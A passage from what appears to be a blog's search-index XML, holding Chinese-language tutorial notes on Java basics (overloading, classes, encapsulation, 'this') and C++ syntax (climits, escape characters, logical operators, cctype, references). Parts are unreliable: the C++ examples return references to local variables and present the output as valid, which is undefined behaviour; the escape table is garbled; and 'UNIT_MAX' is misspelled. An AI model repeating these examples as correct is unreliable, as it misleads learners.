class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="方法重载"><a class="markdownIt-Anchor" href="#方法重载"></a> 方法重载</h2><p>方法重载指同一个类中定义的多个方法之间的关系，满足下列条件的多个方法相互构成重载</p><p>● 多个方法在同一个类中</p><p>● 多个方法具有相同的方法名</p><p>● 多个方法的参数不相同，类型不同或者数量不同</p><p>例如：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        System.out.println(sum(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">        System.out.println(sum(<span class="number">1.0</span>,<span class="number">2</span>));</span><br><span class="line">        System.out.println(sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>{</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">sum</span><span class="params">(<span class="keyword">double</span> a,<span class="keyword">double</span> b)</span></span>{</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>{</span><br><span class="line">        <span class="keyword">return</span> a+b+c;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>以上3种方法构成了方法重载，在调用方法时，编译器会根据实参的数据类型来决定调用的哪种方法。</p><h1 id="类和对象"><a class="markdownIt-Anchor" href="#类和对象"></a> 类和对象</h1><p>类的组成：属性和行为</p><p>● 属性：在类中通过成员变量来体现（类中方法外的变量）</p><p>● 行为：在类中通过成员方法来体现（和前面的方法相比去掉关键字static即可）</p><p>创建对象：</p><p>● 格式：类名 对象名 = new 类名();</p><p>● 使用：</p><p>1、使用成员变量：对象名.变量名</p><p>2、使用成员方法：对象名.方法名</p><p>具体语法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名</span>{</span><br><span class="line">    <span class="comment">//成员变量</span></span><br><span class="line">    数据类型<span class="number">1</span> 变量<span class="number">1</span>;</span><br><span class="line">    数据类型<span class="number">2</span> 变量<span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//成员方法</span></span><br><span class="line">    方法<span class="number">1</span>;</span><br><span class="line">    方法<span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>具体操作方法：</p><p>在同一个包里面创建两个类，这里我创建的一个命名为Main一个命名为Student.java：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>{</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">()</span> </span>{</span><br><span class="line">        System.out.println(<span class="string">"学习"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dohomework</span><span class="params">()</span> </span>{</span><br><span class="line">        System.out.println(<span class="string">"做作业"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();<span class="comment">//创建对象</span></span><br><span class="line">        System.out.println(stu.name);<span class="comment">//未赋值，输出null</span></span><br><span class="line">        System.out.println(stu.age); <span class="comment">//未赋值，输出0</span></span><br><span class="line">        stu.study();  <span class="comment">//调用方法</span></span><br><span class="line">        stu.dohomework(); <span class="comment">//调用方法</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="封装"><a class="markdownIt-Anchor" href="#封装"></a> 封装</h1><h2 id="封装-2"><a class="markdownIt-Anchor" href="#封装-2"></a> 封装</h2><p>1、封装概述：</p><p>● 面向对象三大特征之一（封装、继承、多态）</p><p>● 面向对象编程语言对客观世界的模拟，客观世界里成员变量都是隐藏在对象内部的，外届是无法直接操作的</p><p>2、封装原则</p><p>● 将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对隐藏信息的操作和访问成员变量private，提供对应的getXxx()/setXxx()方法</p><p>3、封装好处</p><p>● 通过方法来控制成员变量的操作，提高了代码的安全性</p><p>● 把代码用方法进行封装，提高了代码的复用性</p><h2 id="private关键字"><a class="markdownIt-Anchor" href="#private关键字"></a> private关键字</h2><p>● 是一个权限修饰符。</p><p>● 可以修饰成员（成员变量和成员方法）。</p><p>● 作用是保护成员不被别的类使用，被private修饰的成员只在本类中才能被访问。</p><p>如果需要被其他类使用，相应操作如下：</p><p>● get变量名() ，用于获取成员变量的值，方法用public修饰，格式为getXxx()</p><p>● set变量名(参数) ，用于设置成员变量的值，方法用public修饰，格式为setXxx()</p><p>举个例子看下用法：</p><p>创建两个类，一个命名为Student.java：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>{</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> n)</span></span>{</span><br><span class="line">        age = n;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>{</span><br><span class="line">        System.out.println(name+<span class="string">","</span>+age);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>另一个命名为Main.java：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        <span class="comment">//Student t = new Student();</span></span><br><span class="line">        stu.name = <span class="string">"李华"</span>;</span><br><span class="line">        stu.setAge(<span class="number">20</span>);</span><br><span class="line">        stu.info();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果为：李华,20</p><p>这里有个高级操作，可以在setAge里面设置范围：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> n)</span></span>{</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">0</span>){</span><br><span class="line">        System.out.println(<span class="string">"输入错误"</span>);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        age = n;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="this关键字"><a class="markdownIt-Anchor" href="#this关键字"></a> this关键字</h2><p>1、this修饰的变量用于指代成员变量</p><p>● 方法的形参如果与成员变量同名，不带this修饰的变量指的是形参，而不是成员变量</p><p>● 方法的形参没有与成员变量同名，不带this修饰的变量指的是成员变量</p><p>2、使用条件：解决局部变量隐藏成员变量</p><p>3、this：代表所在类的对象引用</p><p>● 方法被哪个对象调用，this就代表哪个对象</p><p>用上面程序举个例子：(Main.java同上)</p><p>Student.java：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>{</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>{ <span class="comment">//这里形参与变量名同名,考虑使用this</span></span><br><span class="line">        age = age;  <span class="comment">//这种方法，程序输出的：李华,0</span></span><br><span class="line">        <span class="keyword">this</span>.age = age; <span class="comment">//用this，程序输出：李华,20</span></span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>{</span><br><span class="line">        System.out.println(name+<span class="string">","</span>+age);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++一些常用语法</title>
      <link href="/posts/c/"/>
      <url>/posts/c/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="climits头文件"><a class="markdownIt-Anchor" href="#climits头文件"></a> climits头文件</h1><p><strong>符号常量：</strong></p><table><thead><tr><th style="text-align:center"><strong>符号常量</strong></th><th style="text-align:center"><strong>表示</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>CHAR_BIT</strong></td><td style="text-align:center"><strong>char的位数</strong></td></tr><tr><td style="text-align:center"><strong>CHAR_MAX</strong></td><td style="text-align:center"><strong>char的最大值</strong></td></tr><tr><td style="text-align:center"><strong>CHAR_MIN</strong></td><td style="text-align:center"><strong>char的最小值</strong></td></tr><tr><td style="text-align:center"><strong>SCHAR_MAX</strong></td><td style="text-align:center"><strong>signed char的最大值</strong></td></tr><tr><td style="text-align:center"><strong>SCHAR_MIN</strong></td><td style="text-align:center"><strong>signed char的最小值</strong></td></tr><tr><td style="text-align:center"><strong>UCHAR_MAX</strong></td><td style="text-align:center"><strong>unsigned char的最大值</strong></td></tr><tr><td style="text-align:center"><strong>SHRT_MAX</strong></td><td style="text-align:center"><strong>short的最大值</strong></td></tr><tr><td style="text-align:center"><strong>SHRT_MIN</strong></td><td style="text-align:center"><strong>short的最小值</strong></td></tr><tr><td style="text-align:center"><strong>USHRT_MAX</strong></td><td style="text-align:center"><strong>unsigned short的最大值</strong></td></tr><tr><td style="text-align:center"><strong>INT_MAX</strong></td><td style="text-align:center"><strong>int的最大值</strong></td></tr><tr><td style="text-align:center"><strong>INT_MIN</strong></td><td style="text-align:center"><strong>int的最小值</strong></td></tr><tr><td style="text-align:center"><strong>UNIT_MAX</strong></td><td style="text-align:center"><strong>unsigned int的最大值</strong></td></tr><tr><td style="text-align:center"><strong>LONG_MAX</strong></td><td style="text-align:center"><strong>long的最大值</strong></td></tr><tr><td style="text-align:center"><strong>LONG_MIN</strong></td><td style="text-align:center"><strong>long的最小值</strong></td></tr><tr><td style="text-align:center"><strong>ULONG_MAX</strong></td><td style="text-align:center"><strong>unsigned long的最大值</strong></td></tr><tr><td style="text-align:center"><strong>LLONG_MAX</strong></td><td style="text-align:center"><strong>long long的最大值</strong></td></tr><tr><td style="text-align:center"><strong>LLONG_MIN</strong></td><td style="text-align:center"><strong>long long的最小值</strong></td></tr><tr><td style="text-align:center"><strong>ULLONG_MAX</strong></td><td style="text-align:center"><strong>unsigned long long的最大值</strong></td></tr></tbody></table><h1 id="打印进制数"><a class="markdownIt-Anchor" href="#打印进制数"></a> 打印进制数</h1><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cout</span> &lt;&lt; number ; <span class="comment">//输出十进制</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; number;  <span class="comment">//输出十六进制</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; oct &lt;&lt; number;  <span class="comment">//输出八进制</span></span><br></pre></td></tr></tbody></table></figure><h1 id="转义字符"><a class="markdownIt-Anchor" href="#转义字符"></a> 转义字符</h1><table><thead><tr><th style="text-align:center"><strong>字符名称</strong></th><th style="text-align:center"><strong>ASCII符号</strong></th><th style="text-align:center"><strong>C++代码</strong></th><th style="text-align:center"><strong>十进制ASCII码</strong></th><th style="text-align:center"><strong>十六进制ASCII码</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>换行符</strong></td><td style="text-align:center"><strong>NL(LF)</strong></td><td style="text-align:center"><strong>\n</strong></td><td style="text-align:center"><strong>10</strong></td><td style="text-align:center"><strong>0xA</strong></td></tr><tr><td style="text-align:center"><strong>水平制表符</strong></td><td style="text-align:center"><strong>HT</strong></td><td style="text-align:center"><strong>\t</strong></td><td style="text-align:center"><strong>9</strong></td><td style="text-align:center"><strong>0x9</strong></td></tr><tr><td style="text-align:center"><strong>垂直制表符</strong></td><td style="text-align:center"><strong>VT</strong></td><td style="text-align:center"><strong>\v</strong></td><td style="text-align:center"><strong>11</strong></td><td style="text-align:center"><strong>0xB</strong></td></tr><tr><td style="text-align:center"><strong>退格</strong></td><td style="text-align:center"><strong>BS</strong></td><td style="text-align:center"><strong>\b</strong></td><td style="text-align:center"><strong>8</strong></td><td style="text-align:center"><strong>0x8</strong></td></tr><tr><td style="text-align:center"><strong>回车</strong></td><td style="text-align:center"><strong>CR</strong></td><td style="text-align:center"><strong>\r</strong></td><td style="text-align:center"><strong>13</strong></td><td style="text-align:center"><strong>0xD</strong></td></tr><tr><td style="text-align:center"><strong>振铃</strong></td><td style="text-align:center"><strong>BEL</strong></td><td style="text-align:center"><strong>\a</strong></td><td style="text-align:center"><strong>7</strong></td><td style="text-align:center"><strong>0x7</strong></td></tr><tr><td style="text-align:center"><strong>反斜杠</strong></td><td style="text-align:center">*<em>*</em></td><td style="text-align:center"><strong>\</strong></td><td style="text-align:center"><strong>92</strong></td><td style="text-align:center"><strong>0x5C</strong></td></tr><tr><td style="text-align:center"><strong>问号</strong></td><td style="text-align:center"><strong>?</strong></td><td style="text-align:center"><strong>?</strong></td><td style="text-align:center"><strong>63</strong></td><td style="text-align:center"><strong>0x3F</strong></td></tr><tr><td style="text-align:center"><strong>单引号</strong></td><td style="text-align:center"><strong>’</strong></td><td style="text-align:center"><strong>’</strong></td><td style="text-align:center"><strong>39</strong></td><td style="text-align:center"><strong>0x27</strong></td></tr><tr><td style="text-align:center"><strong>双引号</strong></td><td style="text-align:center"><strong>"</strong></td><td style="text-align:center"><strong>"</strong></td><td style="text-align:center"><strong>34</strong></td><td style="text-align:center"><strong>0x22</strong></td></tr></tbody></table><h1 id="逻辑与-或-非"><a class="markdownIt-Anchor" href="#逻辑与-或-非"></a> 逻辑与、或、非</h1><p><strong>逻辑或(OR)：</strong></p><table><thead><tr><th style="text-align:center"><strong>expr1和expr2的值</strong></th><th style="text-align:center"><strong>expr1 || expr2的值</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>expr1 == true, expr2 == true</strong></td><td style="text-align:center"><strong>true</strong></td></tr><tr><td style="text-align:center"><strong>expr1 == true, expr2 == false</strong></td><td style="text-align:center"><strong>true</strong></td></tr><tr><td style="text-align:center"><strong>expr1 == false, expr2 == true</strong></td><td style="text-align:center"><strong>true</strong></td></tr><tr><td style="text-align:center"><strong>expr1 == false, expr2 == false</strong></td><td style="text-align:center"><strong>false</strong></td></tr></tbody></table><p><strong>逻辑与(AND)：</strong></p><table><thead><tr><th style="text-align:center"><strong>expr1和expr2的值</strong></th><th style="text-align:center"><strong>expr1 &amp;&amp; expr2的值</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>expr1 == true, expr2 == true</strong></td><td style="text-align:center"><strong>true</strong></td></tr><tr><td style="text-align:center"><strong>expr1 == true, expr2 == false</strong></td><td style="text-align:center"><strong>false</strong></td></tr><tr><td style="text-align:center"><strong>expr1 == false, expr2 == true</strong></td><td style="text-align:center"><strong>false</strong></td></tr><tr><td style="text-align:center"><strong>expr1 == false, expr2 == false</strong></td><td style="text-align:center"><strong>false</strong></td></tr></tbody></table><p><strong>逻辑非(NOT)：</strong></p><table><thead><tr><th style="text-align:center"><strong>expr的值</strong></th><th style="text-align:center"><strong>！expr的值</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>expr == true</strong></td><td style="text-align:center"><strong>false</strong></td></tr><tr><td style="text-align:center"><strong>expr == false</strong></td><td style="text-align:center"><strong>true</strong></td></tr></tbody></table><p><strong>逻辑运算符的另一种表示：</strong></p><table><thead><tr><th style="text-align:center"><strong>运算符</strong></th><th style="text-align:center"><strong>另一种表示</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>&amp;&amp;</strong></td><td style="text-align:center"><strong>and</strong></td></tr><tr><td style="text-align:center"><strong>||</strong></td><td style="text-align:center"><strong>or</strong></td></tr><tr><td style="text-align:center"><strong>!</strong></td><td style="text-align:center"><strong>not</strong></td></tr></tbody></table><h1 id="字符函数库cctype"><a class="markdownIt-Anchor" href="#字符函数库cctype"></a> 字符函数库cctype</h1><table><thead><tr><th style="text-align:center"><strong>函数名称</strong></th><th style="text-align:center"><strong>返回值</strong></th></tr></thead><tbody><tr><td style="text-align:center"><strong>isalnum()</strong></td><td style="text-align:center"><strong>若参数是字母或者数字，返回true</strong></td></tr><tr><td style="text-align:center"><strong>isalpha()</strong></td><td style="text-align:center"><strong>若参数是字母，返回true</strong></td></tr><tr><td style="text-align:center"><strong>iscntrl()</strong></td><td style="text-align:center"><strong>若参数是控制字符，返回true</strong></td></tr><tr><td style="text-align:center"><strong>isdigit()</strong></td><td style="text-align:center"><strong>若参数是数字（0~9），返回true</strong></td></tr><tr><td style="text-align:center"><strong>isgraph()</strong></td><td style="text-align:center"><strong>若参数是除空格以外的打印字符，返回true</strong></td></tr><tr><td style="text-align:center"><strong>islower()</strong></td><td style="text-align:center"><strong>若参数是小写字母，返回true</strong></td></tr><tr><td style="text-align:center"><strong>isupper()</strong></td><td style="text-align:center"><strong>若参数是大写字母，返回true</strong></td></tr><tr><td style="text-align:center"><strong>isprint()</strong></td><td style="text-align:center"><strong>若参数是打印字符，返回true</strong></td></tr><tr><td style="text-align:center"><strong>ispunct()</strong></td><td style="text-align:center"><strong>若参数是标点符号，返回true</strong></td></tr><tr><td style="text-align:center"><strong>isspace()</strong></td><td style="text-align:center"><strong>若参数是标准空白字符（空格、换行符、回车、水平制表符、垂直制表符），返回true</strong></td></tr><tr><td style="text-align:center"><strong>isxdigit()</strong></td><td style="text-align:center"><strong>若参数是16进制数字（0 ~ 9，a ~ f，A ~ F），返回true</strong></td></tr><tr><td style="text-align:center"><strong>tolower()</strong></td><td style="text-align:center"><strong>若参数是大写字符，返回其小写，否则返回该参数</strong></td></tr><tr><td style="text-align:center"><strong>toupper()</strong></td><td style="text-align:center"><strong>若参数是小写字符，返回其大写，否则返回该参数</strong></td></tr></tbody></table><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p>作用：<strong>给变量起别名</strong></p><p>语法：<strong>数据类型 &amp;别名 =  原名</strong></p><p>本质：<strong>指针常量</strong></p><p>例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> &amp;b = a;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"a = "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"b = "</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果，a = 10，b = 10；</p><blockquote><p>引用需要注意：第一，定义别名时必须初始化；第二，别名一旦初始化，不能修改，但是可以赋值</p></blockquote><h2 id="引用做函数参数"><a class="markdownIt-Anchor" href="#引用做函数参数"></a> 引用做函数参数</h2><p>我们用两数交换来说明：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> &amp;a,<span class="keyword">int</span> &amp;b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">3</span>,b=<span class="number">5</span>;</span><br><span class="line">    swap(a,b);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"a = "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"b = "</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：a = 5，b = 3；</p><p>引用传递和地址传递类似，都可以实现<strong>形参影响实参</strong>的效果，但是值传递不可以。</p><h2 id="引用做函数返回值"><a class="markdownIt-Anchor" href="#引用做函数返回值"></a> 引用做函数返回值</h2><p>先来看程序：</p><p>第一种：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> &amp;<span class="title">F1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> &amp;n = F1();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"n = "</span> &lt;&lt; n &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：n = 10</p><blockquote><p>如果打印之后又打印一次，则第一次打印是正确的，因为编译器做了保留，第二次错误，a的内存已经被释放</p></blockquote><p>第二种：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> &amp;<span class="title">F2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> &amp;n = F2();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"n = "</span> &lt;&lt; n &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    F2() = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"n = "</span> &lt;&lt; n &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行结果：n = 10，n = 100</p><blockquote><p>如果函数的返回值是引用，这个函数调用可以作为左值</p></blockquote><script>        document.querySelectorAll('.github-emoji')          